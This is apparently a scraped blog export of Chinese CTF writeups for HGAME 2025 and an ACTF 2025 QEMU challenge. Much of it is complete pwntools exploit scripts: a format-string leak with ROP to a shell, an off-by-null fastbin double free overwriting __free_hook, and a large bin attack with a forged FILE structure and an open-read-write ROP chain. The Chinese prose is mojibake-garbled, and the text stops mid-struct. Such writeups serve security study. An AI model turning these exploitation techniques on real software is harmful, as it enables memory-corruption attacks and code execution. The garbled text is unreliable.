0x119431pop_rsi = libc_base + 0x2601f_read= libc_base + libc.symbols[\"read\"]_open= libc_base + libc.symbols[\"open\"]_write= libc_base + libc.symbols[\"write\"]payload = flat({    0x00: [        p64(0x404154+0xd0),        p64(pop_rsi),        p64(0x404154),        p64(pop_rdx_r12),        p64(0x200),p64(0),         p64(_read),# read(4,buf,0x200)        p64(leave_ret),        p64(leave_ret),    ],    0x50: [        p64(writable_addr-0x50),        p64(leave_ret),    ]})pause()p.send(payload)payload = flat({    0x00: [        p64(0xc0ffee),        p64(pop_rdi),        p64(0x404154+0xe0),        p64(pop_rsi),        p64(0),        p64(pop_rdx_r12),        p64(0),p64(0),        p64(_open), # open(./flag,0,0)        p64(pop_rdi),        p64(0x5),        p64(pop_rsi),        p64(0x404154+0xe0),        p64(pop_rdx_r12),        p64(0x100),p64(0),        p64(_read), #read(5,buf,0x100)        p64(pop_rdi),        p64(0x4),        p64(pop_rsi),        p64(0x404154+0xe0),        p64(pop_rdx_r12),        p64(0x30),p64(0),        p64(_write), #write(4,buf,0x20)    ],    0xd0: [        p64(0x404154),        p64(leave_ret),    ],    0xe0: [        b'./flag\\x00',    ]})pause()p.send(payload)p.interactive()\nformat\nVulnerabilities\n\næ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚\n\n\næ•´å‹åˆ¤æ–­ï¼Œä½¿ç”¨æ— ç¬¦å·æ•´å‹ä¼ å…¥ã€‚è¾“å…¥ä¸€ä¸ªè´Ÿæ•°å³å¯ç»•è¿‡è¾“å…¥é•¿åº¦çš„é™åˆ¶ã€‚\n\nå¯ä»¥æ ˆè¿ç§»ã€‚\nExploit\nä½¿ç”¨ %p æ³„éœ²æ ˆçš„åœ°å€ï¼Œåœ¨ vuln\nå‡½æ•°çš„æ ˆå¸§å†…å†™å…¥æ›´é•¿çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç„¶åæ§åˆ¶ rbp\nåˆ°åˆé€‚ä½ç½®ï¼Œæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ä¸ºæ ¼å¼åŒ–æ¼æ´å¤„ï¼Œæ³„éœ² libc åœ°å€ï¼Œå†æ¬¡è¿›å…¥\nvuln æ„é€  ROP é“¾ã€‚\nfrom pwn import *context.log_level =\"debug\"p = remote(\"node1.hgame.vidar.club\",30762)e = ELF(\"./vuln\")libc = ELF(\"./libc.so.6\")leave_ret = 0x4011eemain = 0x4011f0p.sendlineafter(\"you have n chance to getshell\",str(1))p.sendlineafter(\"type something:\",\"%p\")p.recvuntil(b\"you type: 0x\")stack_addr = p.recvuntil(b\"you have\", drop=True)stack_addr = int(stack_addr,16)log.info(hex(stack_addr))rbp = stack_addr + 0x211cp.sendafter(\"n = \",\"-1\\x00\")pause()payload = flat({    0x00: [        b'%9$p',        p64(rbp),        p64(0x4012cf),    ]})p.sendafter(\"type something:\",payload)p.recvuntil(b\"0x\",drop=True)libc_addr = p.recv(12)libc_addr = int(libc_addr,16)libc_base = libc_addr - 0x29d90log.info(hex(libc_base))binsh_addr = libc_base + next(libc.search(b\"/bin/sh\"))sys_addr = libc_base + libc.sym[\"system\"]pop_rdi = libc_base + 0x2a3e5payload = flat({    0x0c: [        p64(0x40101a),        p64(pop_rdi),        p64(binsh_addr),        p64(sys_addr)    ]})p.sendafter(\"type something:\",payload)p.interactive()\nCompress dot new\né¢˜ç›®ç»™å‡º Nushell ç¼–å†™çš„ Huffman ç¼–ç ï¼Œè§£ç ä»£ç å¦‚ä¸‹\ndef \"decode\" [tree encoded] {    let bits = ($encoded | split chars)    mut result = []    mut current_node = $tree    for bit in $bits {        $current_node = if $bit == '0' {            $current_node.a        } else { $current_node.b }        if 's' in $current_node {            $result ++= [$current_node.s]            $current_node = $tree        }    }    if 's' in $current_node {        $result ++= [$current_node.s]    }    $result | each { into binary } | bytes collect}def \"decompress\" [] {    let input = (open ./enc.txt --raw | split row \"\\n\")    let tree = $input.0 | from json    let encoded_str = $input.1    decode $tree $encoded_str}decompress | save ./flag.txt --force\néƒ¨åˆ†å†…å®¹å‚è€ƒ DeepSeek R1 ç”Ÿæˆ\nTurtle\n\nDIE æ£€æµ‹å­˜åœ¨ upx å£³ï¼Œä½¿ç”¨ x64dbg å®šä½ç¨‹åºå…¥å£ç‚¹å dump è„±å£³ã€‚\nç¨‹åºä½¿ç”¨ä¸¤æ¬¡ RC4\nåŠ å¯†ï¼Œä¾è¯¥åŠ å¯†ç®—æ³•çš„å¯¹ç§°æ€§è´¨ï¼Œç¬¬ä¸€æ¬¡åŠ å¯†å‡½æ•°å¤„ä¼ å…¥å¯†æ–‡å¾—åˆ° keyã€‚\nç¬¬äºŒæ¬¡åŠ å¯†å‡½æ•°å¤„å°† -= patch ä¸º\n+=ï¼Œä¼ å…¥å¯†æ–‡å¾—åˆ° flagã€‚\n\n","categories":["CTF"],"tags":["pwn","re","hgame"]},{"title":"HGAME 2025 Week 2 Writeup","url":"/categories/CTF/hgame-2025-week2-wp/","content":"Signin2Heap\nVulnerabilities\n\nå­˜åœ¨ off-by-null æ¼æ´ï¼Œå½“ prev_size åŸŸå¤ç”¨æ—¶ï¼Œå¯ç½®é›¶ç›¸é‚»\nchunk çš„ prev_inuse ä½ã€‚\n\n\nåªèƒ½ç”³è¯·è‡³å¤š 0xFF å¤§å°çš„å †å—ï¼Œè€ƒè™‘ fastbin attackã€‚\nExploit\nç”±äºç¨‹åºæ²¡æœ‰ç¼–è¾‘åŠŸèƒ½ï¼Œåªèƒ½ä½¿ç”¨ add åŠŸèƒ½ä¿®æ”¹å †æ•°æ®ã€‚å¸ƒç½®å¤§å°åˆ†åˆ«ä¸º\n0xf0, 0x68, 0xf0\nçš„ä¸‰ä¸ªå †å—ï¼Œç„¶åå°† 0xf0 å¤§å°çš„ tcache bin\nå¡«æ»¡ã€‚æ­¤æ—¶é‡Šæ”¾ chunk 0ï¼Œå°†è¿›å…¥ unsorted bin\nã€‚ä¸ºäº†æ³„éœ²å‡º libc æœ‰å…³åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ show åŠŸèƒ½è¾“å‡º freed chunk\nä¸Šçš„æŒ‡é’ˆ (å³ fd )ã€‚é€šè¿‡å¦‚ä¸‹æ“ä½œå¯ä»¥å®ç°ç±»ä¼¼ UAF çš„æ•ˆæœï¼š\n\nä¿®æ”¹ chunk 2 çš„ prev_size å’Œ prev_inuse\nï¼›\né‡Šæ”¾ chunk 2ï¼Œå¼•èµ·å‘ååˆå¹¶ï¼Œæ­¤æ—¶å †ç®¡ç†å™¨è®¤ä¸º chunk 0 ~ chunk 2\néƒ½å·²ç»ä¸ºç©ºé—²çŠ¶æ€ï¼Œæ”¾å…¥ unsorted bin ï¼›\nå…ˆæ¸…ç©ºä¼˜å…ˆçº§æ›´é«˜çš„ tcache bin ï¼Œç„¶åç”³è¯· chunk 0\nå¤§å°çš„å †ï¼Œä» unsorted bin ä¸­å–ï¼Œæ­¤æ—¶ fd ç§»åŠ¨åˆ° chunk 0\nçš„åé¢ã€‚\n\nç»è¿‡ä»¥ä¸Šæ“ä½œåï¼Œchunk 1 çš„ä½ç½®æ°å¥½æ˜¯ unsorted bin\nçš„å¤´éƒ¨ã€‚ä½†åŒæ—¶ç¨‹åºé€»è¾‘ä¸Š chunk 1 å¹¶æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œå¼•èµ·äº† UAFï¼Œdouble\nfreeã€‚\nå†æ¬¡å¡«æ»¡ tcache bin ï¼Œåˆ©ç”¨ fastbin double free\nå¯å®ç°ä»»æ„å†™ã€‚\nfrom pwn import *context.log_level =\"debug\"p = remote(\"node1.hgame.vidar.club\",32253)e = ELF(\"./vuln\")libc = ELF(\"./libc-2.27.so\")def add(index,size,content):    p.sendafter(\"Your choice:\",b\"\\x01\\x00\")    p.sendlineafter(\"Index:\",str(index))    p.sendlineafter(\"Size: \",str(size))    p.sendafter(\"Content: \",content)def show(index):    p.sendafter(\"Your choice:\",b\"\\x03\\x00\")    p.sendlineafter(\"Index:\",str(index))def dele(index):    p.sendafter(\"Your choice:\",b\"\\x02\\x00\")    p.sendlineafter(\"Index:\",str(index))add(0,0xf0,'a')add(1,0x68,'a')add(2,0xf0,'b')for i in range(3,10):  add(i,0xf0,'a')for i in range(3,10): #fill tcache   dele(i)dele(0)dele(1)add(1,0x68,b'a'*0x60+p64(0x170))dele(2)for i in range(3,10):  add(i,0xf0,'a')add(0,0xf0,'a')show(1)main_arena = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))libc_base = main_arena - 0x3ebca0log.info(hex(libc_base))free_hook = libc_base + libc.symbols['__free_hook']one_gadget = libc_base + 0x4f302add(11,0x30,'a')add(12,0x30,'a')for i in range(3,10):    dele(i)for i in range(3,10):    add(i,0x30,'a')for i in range(3,10): #fill tcache    dele(i)dele(11)dele(12) #a padding chunkdele(1) #fastbin double freefor i in range(3,10):    add(i,0x30,'a') #clear tcacheadd(1,0x30,p64(free_hook))add(12,0x30,'qaq')add(11,0x30,'qaq') #clear padding chunkadd(13,0x30,p64(one_gadget)) #a chunk at &lt;__free_hook&gt;dele(0)p.interactive()\nWhere is the vulnerability\n\nç¬¬ä¸€æ¬¡æ‰“è¿™ä¹ˆé«˜ç‰ˆæœ¬çš„\nlibcï¼ˆåŸè°…æˆ‘å½“æ—¶è„‘æŠ½çœ‹æˆ 2.29ï¼Œä¸€å †è€æ¼æ´ç”¨äº†åŠå¤©å‘ç°ä¸è¡Œ hhhï¼‰\n\nç¦ç”¨ execve\nVulnerabilities\n\næ˜æ˜¾çš„ UAF æ¼æ´ã€‚\n\nåªèƒ½ç”³è¯· 0x500 ~ 0x900 å¤§å°çš„å †ï¼Œè€ƒè™‘ large bin\nattackã€‚\nExploit\nå †å—å¤§å°é™åˆ¶å¯¼è‡´æˆ‘ä»¬åªèƒ½ä½¿ç”¨ unsorted bin å’Œ\nlarge binï¼Œå³ä½¿é€šè¿‡ UAF æ¼æ´å¯ä»¥ä¿®æ”¹å †ä¸Šçš„\nsize ä»è€Œä½¿å…¶è¿›å…¥ tcache bin\nï¼Œä½†æ˜¯ä¸èƒ½é‡æ–°ç”³è¯·è¿›è¡Œåˆ©ç”¨ã€‚\næ˜¾è€Œæ˜“è§çš„ï¼Œå¯ä»¥åˆ©ç”¨ unsorted bin çš„ç‰¹æ€§å¿«é€Ÿå¾—åˆ° libc\nåŸºå€ã€‚\nåŒæ—¶ï¼Œå¸ƒç½®åç»­çš„å †å—ï¼Œä»¥è¿›è¡Œ large bin attackã€‚\nlarge bin attack çš„æ“ä½œç®€è¦æè¿°å¦‚ä¸‹ï¼Œå½“ç„¶åœ¨ how2heap\nä¸­æœ‰æ›´å¥½æ›´è¯¦ç»†çš„æè¿°ï¼š\n\nç”³è¯·ä¸¤ä¸ª\nchunkï¼Œä¸”å¤§å°ä¸ç›¸åŒï¼Œå¹¶åœ¨å…¶ä¹‹åéƒ½ç”³è¯·ä»»æ„å¤§å°çš„å †å—ï¼Œé˜²æ­¢é‡Šæ”¾ååˆå¹¶ï¼›\né‡Šæ”¾ chunk 0ï¼›\nç”³è¯·ä¸€ä¸ªå¤§äº chunk 0 å¤§å°çš„å †ï¼Œchunk 0 å°†è¿›å…¥\nlarge binï¼›\né‡Šæ”¾ chunk 2ï¼›\nä¿®æ”¹ chunk 0 çš„ bk_nextsize ä¸º\ntarget - 0x20{sizeof(prev_size + fd + bk + fd_nextsize)}\nã€‚\né‡å¤ç¬¬ä¸‰æ­¥ï¼Œchunk 2 å°†è¿›å…¥ large bin ï¼Œç”±äº chunk 2\næ›´å°ï¼Œå¯¼è‡´æ“ä½œ\nbk_nextsize-&gt;fd_nextsize = &amp;chunk2ã€‚\n\næ­¤æ—¶å°±åœ¨ç›®æ ‡ä½ç½®å†™å…¥äº† chunk 2 çš„ prev_size åœ°å€ã€‚\né€šè¿‡ä¸€ç§å«åš House of apple\nçš„æ–¹å¼ï¼Œå°±å¯ä»¥æ”»å‡» IOï¼ŒåŠ«æŒç¨‹åºæ‰§è¡Œæµã€‚\nåœ¨æ³„éœ²å‡º libc åœ°å€åï¼Œè¿›è€Œå¾—åˆ° IO_list_all çš„åœ°å€ï¼Œåˆ©ç”¨\nlarge bin attack å°† chunk åœ°å€å†™å…¥ï¼Œä¹‹ååœ¨ chunk 2 ä¸Šä¼ªé€  FILE\nç»“æ„ä½“ã€‚\nåŸç†éƒ¨åˆ†è¯·è‡ªè¡ŒæŸ¥æ‰¾ï¼ˆæ¯•ç«Ÿæˆ‘è¿˜æ²¡å®Œå…¨å¼„æ˜ç™½ï¼‰ã€‚æˆ‘ä»¬ä¸»è¦å…³æ³¨ä¼ªé€  IO çš„æœ€åä¸€è¡Œï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬è·³è½¬åˆ°ä¸€ä¸ªåœ°å€ï¼Œå³æ§åˆ¶ä¸€æ¬¡\n$RIP ã€‚æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰¾åˆ°ä¸€ä¸ª\ngadgetï¼Œå¸®åŠ©æˆ‘ä»¬å®ç°æ ˆè¿ç§»ï¼Œæ‰§è¡Œ ROP é“¾ã€‚\nå¯ä»¥åˆ©ç”¨çš„ gadget å¦‚ä¸‹ï¼š\n\n\ngadget 1\n\nåŠ¨æ€è°ƒè¯•å¯ä»¥å‘ç° $rax æŒ‡å‘ fake_io\næœ‰å…³åœ°å€ï¼Œå› æ­¤å¯ä»¥æ”¹å˜ $rdx çš„å€¼ã€‚\nå°† $rdx æ”¹ä¸ºä¸€å¤„å¯è¯»å†™æ®µï¼Œæ‰§è¡Œä¸‹ä¸€æ®µ gadgetï¼š\n\n\ngadget 2.1\n\n\n\ngadget 2.2\n\nä¿®æ”¹ $rsp å®ç°æ ˆè¿ç§»ï¼Œæ³¨æ„åœ¨åé¢ä¼šå°†\n$rcx=[rdx+0xa8]\nå…¥æ ˆï¼Œæ”¹ä¸ºä¸€ä¸ªå¯¹åç»­æ— å½±å“çš„å¯æ‰§è¡Œåœ°å€å³å¯ï¼Œæˆ–è€… ROP çš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚\næœ€åè¿›å…¥ exit() è§¦å‘ç›¸å…³è°ƒç”¨é“¾ï¼Œæ‰§è¡Œ\norwï¼ˆå¦‚æ­¤æœ‰ä»ªå¼æ„Ÿçš„æ“ä½œè‡ªç„¶æ˜¯æ‰‹åŠ¨å®Œæˆï¼‰ã€‚\nfrom pwn import *context.log_level =\"debug\"p = remote(\"node1.hgame.vidar.club\",31067)e = ELF(\"./vuln\")libc = ELF(\"./libc.so.6\")def add(index,size):    p.sendlineafter(\"5. Exit\",b\"1\")    p.sendlineafter(\"Index:\",str(index))    p.sendlineafter(\"Size: \",str(size))def show(index):    p.sendlineafter(\"5. Exit\",b\"4\")    p.sendlineafter(\"Index:\",str(index))def dele(index):    p.sendlineafter(\"5. Exit\",b\"2\")    p.sendlineafter(\"Index:\",str(index))def edit(index,content):    p.sendlineafter(\"5. Exit\",b\"3\")    p.sendlineafter(\"Index:\",str(index))    p.sendafter(\"Content: \",content)        add(0,0x528)add(1,0x508) #prevent consolidatingadd(2,0x518)add(3,0x721)dele(0)show(0)main_arena = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))libc_base = main_arena - 0x203b20IO_list_all=libc_base+libc.symbols['_IO_list_all']_IO_stdfile_2_lock=libc_base+0x205700_open=libc_base+libc.sym['open']_read=libc_base+libc.sym['read']_write=libc_base+libc.sym['write']pop_rdi = libc_base + 0x10f75bpop_rsi = libc_base + 0x110a4dpop_rdx = libc_base + 0x66b9a #pop rdx ; ret 0x19gadget = libc_base + 0x176f0esetcontext = libc_base + 0x4a98dret = libc_base + 0x2882flog.info(hex(libc_base))add(4,0x558)dele(2)show(0)chunk_fd = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))edit(0,b'a'*16)show(0)fd_nextsize = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))heap_base = fd_nextsize + 0x10log.info(hex(heap_base))edit(0,p64(chunk_fd)*2+p64(fd_nextsize)+p64(IO_list_all-0x20))add(5,0x558) #large bin attack: write chunk address at targetorw_addr = heap_base + 0x1bf0file_addr = heap_base + 0xa30IO_wide_data_addr=file_addrwide_vtable_addr=file_addr+0xe8-0x68fake_io = b\"\"fake_io += p64(0)  # _IO_read_endfake_io += p64(0)  # _IO_read_basefake_io += p64(0)  # _IO_write_basefake_io += p64(1)  # _IO_write_ptrfake_io += p64(0)  # _IO_write_endfake_io += p64(0)  # _IO_buf_base;fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)fake_io += p64(0)  # _IO_save_basefake_io += p64(0)*3  # from _IO_backup_base to _markersfake_io += p64(0)  # the FILE chain ptrfake_io += p32(2)  # _fileno for stderr is 2fake_io += p32(0)  # _flags2, usually 0fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1fake_io += p16(0)  # _cur_columnfake_io += b\"\\x00\"  # _vtable_offsetfake_io += b\"\\n\"  # _shortbuf[1]fake_io += p32(0)  # paddingfake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lockfake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1fake_io += p64(0)  # _codecvt, usually 0fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1fake_io += p64(0) * 2  # from _freeres_list to __pad5fake_io += p64(orw_addr+0x100) #rdx value(__pad5)fake_io += p32(0xFFFFFFFF)  # _mode, usually -1fake_io += b\"\\x00\" * 19  # _unused2fake_io = fake_io.ljust(0xc8, b'\\x00')  # adjust to vtablefake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # fake vtablefake_io += p64(wide_vtable_addr)fake_io += p64(gadget) #set rdxedit(2,fake_io)orw_payload = flat({    0x00: [        p64(pop_rdi),        p64(orw_addr+0x128),        p64(pop_rsi),        p64(0),        p64(pop_rdx),        p64(0),        p64(_open), # open(./flag,0,0)        b'a'*0x19, # padding        p64(pop_rdi),        p64(3),        p64(pop_rsi),        p64(orw_addr+0x200),        p64(pop_rdx),        p64(0x30),        p64(_read), # read(3,buf,0x30)        b'a'*0x19,        p64(pop_rdi),        p64(1),        p64(pop_rsi),        p64(orw_addr+0x200),        p64(pop_rdx),        p64(0x30),        p64(_write), # write(1,buf,0x30)        b'a'*0x19,    ],    0x120: [        p64(setcontext),        b'./flag\\x00\\x00',    ],    0x1a0: [        p64(orw_addr), #rsp value        p64(ret),    ]})edit(5,orw_payload)edit(1,b'a'*0x500+b' sh;') #reserved for debug, [$rdi]p.interactive()\nHit list\nå¾ˆé—æ†¾æœ¬é¢˜æ²¡æœ‰è§£å‡ºï¼Œå› ä¸ºå‰é¢è¾ƒå°‘æ¥è§¦çš„å †é¢˜è€—è´¹äº†æˆ‘æŒºå¤šå¿ƒåŠ›çš„ï¼Œåˆ°è¿™å·²ç»æ²¡ä»€ä¹ˆç²¾åŠ›å»åšäº†ã€‚ä¸è¿‡æ”¶è·å¾ˆå¤šï¼Œæ˜¯å¤§äºé—æ†¾çš„ã€‚\næ˜å¹´è§ï¼\nå¹³å°å¾ˆå¥½çœ‹ï¼Œå‡ºé¢˜äººå¾ˆçƒ­å¿ƒï¼Œé¢˜ç›®å¾ˆéš¾ï¼ˆ\nhgame{see_you_next_year!!!}\n","categories":["CTF"],"tags":["pwn","hgame"]},{"title":"QEMU PWN - EasyDMA","url":"/categories/CTF/easydma/","content":"EasyDMA\nFrom: ACTF 2025\né¢˜ç›®ç»™å‡ºä¸€ä¸ªå»ç¬¦å·çš„ qemu äºŒè¿›åˆ¶æ–‡ä»¶\nqemu-system-x86_64ï¼Œå¯åŠ¨å‚æ•°å¦‚ä¸‹\n#!/bin/shtimeout --foreground 300 ./qemu-system-x86_64 \\    -L pc-bios \\    -m 1024 \\    -kernel bzImage \\    -initrd rootfs.cpio \\    -drive file=null-co://,if=none,id=mydisk \\    -device virtio-blk-pci,drive=mydisk,ioeventfd=off \\    -device readflag \\    -append \"priority=low console=ttyS0\" \\    -monitor /dev/null \\    -nographic\n\næ·»åŠ ä¸¤ä¸ªè®¾å¤‡ virtio-blk-pci, readflagã€‚\nåæ±‡ç¼–å¯ä»¥æ‰¾åˆ° readflag é€šè¿‡ mmio çš„è¯»ã€å†™å›è°ƒå‡½æ•°ï¼š\n__int64 __fastcall readflag_mmio_read(__int64 opaque, unsigned __int64 addr, int size){  __int64 result; // rax  if ( addr &gt; 0x7F )  {    result = -1LL;    if ( size != 4 )      return result;  }  else if ( size != 4 )  {    result = -1LL;    if ( size != 8 )      return result;  }  result = 0xDEADBEEFLL;  if ( addr )  {    if ( addr == 8 )      return *(_QWORD *)(opaque + 2984);    else      return -1LL;  }  return result;}\nvoid __fastcall readflag_mmio_write(__int64 opaque, unsigned __int64 addr, size_t val, int size){  void *v4; // rbp  FILE *v5; // rax  FILE *v6; // r12  size_t v7; // rax  int v8; // [rsp+0h] [rbp-20h]  if ( addr &gt; 0x7F )  {    if ( size != 4 )      return;  }  else if ( size != 4 )  {    if ( size == 8 &amp;&amp; addr == 8 )      goto LABEL_6;    return;  }  if ( addr )  {    if ( addr == 8 )LABEL_6:      *(_QWORD *)(opaque + 2984) = val;  }  else if ( val &lt;= 0xFFF )  {    v8 = val;    v4 = malloc(val);    if ( v4 )    {      v5 = fopen64(\"flag\", \"r\");      v6 = v5;      if ( v5 )      {        v7 = fread(v4, 1uLL, (unsigned int)(v8 - 1), v5);        if ( v7 )          *((_BYTE *)v4 + v7) = 0;        else          puts(\"No data read from the file.\");        free(v4);        fclose(v6);      }      else      {        perror(\"Error opening file\");        free(v4);      }    }    else    {      perror(\"Memory allocation failed\");    }  }}\nVirtio Block Device1\nData types definition\nFor the integer data types used in the structure definitions, the\nfollowing conventions are used:\n\nu8, u16, u32, u64\nAn unsigned integer of the specified length in bits.\nle16, le32, le64\nAn unsigned integer of the specified length in bits, in little-endian\nbyte order.\n\n#define u8 uint8_t#define u16 uint16_t#define u32 uint32_t#define u64 uint64_t#define le16 u16#define le32 u32#define le64 u64\nPCI Capabilities\nstruct virtio_pci_cap {    u8 cap_vndrÍ¾ /* Generic PCI field: PCI_CAP_ID_VNDR */    u8 cap_nextÍ¾ /* Generic PCI field: next ptr. */    u8 cap_lenÍ¾ /* Generic PCI field: capability length */    u8 cfg_typeÍ¾ /* Identifies the structure. */    u8 barÍ¾ /* Where to find it. */    u8 idÍ¾ /* Multiple capabilities of the same type */    u8 padding[2]Í¾ /* Pad to full dword. */    le32 offsetÍ¾ /* Offset within bar. */    le32 lengthÍ¾ /* Length of the structure, in bytes. */}Í¾\ncfg_type identifies the structure,\naccording to the following table:\n/* Common configuration */#define VIRTIO_PCI_CAP_COMMON_CFG 1/* Notifications */#define VIRTIO_PCI_CAP_NOTIFY_CFG 2/* ISR Status */#define VIRTIO_PCI_CAP_ISR_CFG 3/* Device specific configuration */#define VIRTIO_PCI_CAP_DEVICE_CFG 4/* PCI configuration access */#define VIRTIO_PCI_CAP_PCI_CFG 5/* Shared memory region */#define VIRTIO_PCI_CAP_SHARED_MEMORY_CFG 8/* Vendor-specific data */#define VIRTIO_PCI_CAP_VENDOR_CFG 9\nFor common configuration, its layout is\nbelow:\nstruct virtio_pci_common_cfg {    /* About the whole device. */    le32 device_feature_selectÍ¾ /* read-write */    le32 device_featureÍ¾ /* read-only for driver */    le32 driver_feature_selectÍ¾ /* read-write */    le32 driver_featureÍ¾ /* read-write */    le16 config_msix_vectorÍ¾ /* read-write */    le16 num_queuesÍ¾ /* read-only for driver */    u8 device_statusÍ¾ /* read-write */    u8 config_generationÍ¾ /* read-only for driver */    /* About a specific virtqueue. */    le16 queue_selectÍ¾ /* read-write */    le16 queue_sizeÍ¾ /* read-write */    le16 queue_msix_vectorÍ¾ /* read-write */    le16 queue_enableÍ¾ /* read-write */    le16 queue_notify_offÍ¾ /* read-only for driver */    le64 queue_descÍ¾ /* read-write */    le64 queue_driverÍ¾ /* read-write */    le64 queue_deviceÍ¾ /* read-write */    le16 queue_notif_config_dataÍ¾ /* read-only for driver */    le16 queue_resetÍ¾ /* read-write */    /* About the administration virtqueue. */    le16 admin_queue_indexÍ¾ /* read-only for driver */    le16 admin_queue_numÍ¾ /* read-only for driver */}Í¾\nFor notification, its layout is below:\nstruct virtio_pci_notify_cap {    struct virtio_pci_cap capÍ¾    le32 notify_off_multiplierÍ¾ /* Multiplier for queue_notify_off. */}Í¾\nWe recognize these type, and record the offset.\nvoid print_cap(struct virtio_pci_cap* cap){    printf(\"cap_len: %x\\n\", cap-&gt;cap_len);    switch(cap-&gt;cfg_type){        case VIRTIO_PCI_CAP_COMMON_CFG:            printf(\"cfg_type: common\\n\");            break;        case VIRTIO_PCI_CAP_NOTIFY_CFG:            printf(\"cfg_type: notify\\n\");            break;        case VIRTIO_PCI_CAP_ISR_CFG:            printf(\"cfg_type: isr\\n\");            break;        case VIRTIO_PCI_CAP_DEVICE_CFG:            printf(\"cfg_type: device\\n\");            break;        case VIRTIO_PCI_CAP_PCI_CFG:            printf(\"cfg_type: pci\\n\");            break;        case VIRTIO_PCI_CAP_SHARED_MEMORY:            printf(\"cfg_type: shared memory\\n\");            break;        case VIRTIO_PCI_CAP_VENDOR_CFG:            printf(\"cfg_type: vendor\\n\");            break;        default:            printf(\"cfg_type: unknown\\n\");            break;    }    printf(\"bar: %x\\n\", cap-&gt;bar);    printf(\"id: %x\\n\", cap-&gt;id);    printf(\"offset: %x\\n\", cap-&gt;offset);    printf(\"length: %x\\n\", cap-&gt;length);}switch(cap.cfg_type){            case VIRTIO_PCI_CAP_COMMON_CFG:                virtio_common_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_NOTIFY_CFG:                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);                break;            case VIRTIO_PCI_CAP_ISR_CFG:                virtio_isr_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_DEVICE_CFG:                virtio_device_mmio = virtio_mmio + cap.offset;                break;            default:                break;        }\nVirtqueue2\nThe mechanism for bulk data transport on virtio devices is\npretentiously called a virtqueue. Each device can have zero or more\nvirtqueues.\nEach virtqueue can consist of up to 3 parts:\nâ€‹ â€¢ Descriptor Area - used for describing buffers\nâ€‹ â€¢ Driver Area - extra data supplied by driver to the device. Also\ncalled avail virtqueue.\nâ€‹ â€¢ Device Area - extra data supplied by device to driver. Also called\nused virtqueue.\n\n\nShared memory with split ring\nelements\n\nThere areas structure defined below:\nstruct virtq_desc {    /* Address (guest-physical). */    le64 addr;    /* Length. */    le32 len;/* This marks a buffer as continuing via the next field. */#define VIRTQ_DESC_F_NEXT 1/* This marks a buffer as device write-only (otherwise device read-only). */#define VIRTQ_DESC_F_WRITE 2/* This means the buffer contains a list of buffer descriptors. */#define VIRTQ_DESC_F_INDIRECT 4    /* The flags as indicated above. */    le16 flags;    /* Next field if flags &amp; NEXT */    le16 next;};struct virtq_avail {#define VIRTQ_AVAIL_F_NO_INTERRUPT 1    le16 flags;    le16 idx;    le16 ring[VIRTIO_QUEUE_SIZE];    le16 used_event; /* Only if VIRTIO_F_EVENT_IDX */};struct virtq_used_elem {    /* Index of start of used descriptor chain. */    le32 id;    /*    * The number of bytes written into the device writable portion of    * the buffer described by the descriptor chain.    */    le32 len;};struct virtq_used {#define VIRTQ_USED_F_NO_NOTIFY 1    le16 flags;    le16 idx;    struct virtq_used_elem ring[VIRTIO_QUEUE_SIZE];    le16 avail_event; /* Only if VIRTIO_F_EVENT_IDX */};\n\nThe driver queues requests to the virtqueue, the type of the request\nis either a read (VIRTIO_BLK_T_IN), a write (VIRTIO_BLK_T_OUT), a\ndiscard (VIRTIO_BLK_T_DISCARD), a write zeroes\n(VIRTIO_BLK_T_WRITE_ZEROES) or a flush (VIRTIO_BLK_T_FLUSH).\nstruct virtio_blk_req {         le32 type;         le32 reserved;         le64 sector;         u8 data[][512];         u8 status; };  struct virtio_blk_discard_write_zeroes {        le64 sector;        le32 num_sectors;        struct {                le32 unmap:1;                le32 reserved:31;        } flags; };#define VIRTIO_BLK_T_IN           0 #define VIRTIO_BLK_T_OUT          1 #define VIRTIO_BLK_T_FLUSH        4 #define VIRTIO_BLK_T_DISCARD      11 #define VIRTIO_BLK_T_WRITE_ZEROES 13\nMMIO3\nMemory-mapped I/O (MMIO) uses the\nsame address space to address both main memory and I/O devices. The\nmemory and registers of the I/O devices are mapped to (associated with)\naddress values, so a memory address may refer to either a portion of\nphysical RAM or to memory and registers of the I/O device.\nuint8_t mmio_read8(void* addr){    return *(volatile uint8_t*)addr;}uint16_t mmio_read16(void* addr){    return *(volatile uint16_t*)addr;}uint32_t mmio_read32(void* addr){    return *(volatile uint32_t*)addr;}uint64_t mmio_read64(void* addr){    return *(volatile uint64_t*)addr;}void mmio_write8(void* addr, uint8_t val){    *(volatile uint8_t*)addr = val;}void mmio_write16(void* addr, uint16_t val){    *(volatile uint16_t*)addr = val;}void mmio_write32(void* addr, uint32_t val){    *(volatile uint32_t*)addr = val;}void mmio_write64(void* addr, uint64_t val){    *(volatile uint64_t*)addr = val;}\nDevice configuration layout\nstruct virtio_blk_config {        le64 capacityÍ¾        le32 size_maxÍ¾        le32 seg_maxÍ¾    struct virtio_blk_geometry {        le16 cylindersÍ¾        u8 headsÍ¾        u8 sectorsÍ¾    } geometryÍ¾    le32 blk_sizeÍ¾    struct virtio_blk_topology {        // # of logical blocks per physical block (log2)        u8 physical_block_expÍ¾        // offset of first aligned logical block        u8 alignment_offsetÍ¾        // suggested minimum I/O size in blocks        le16 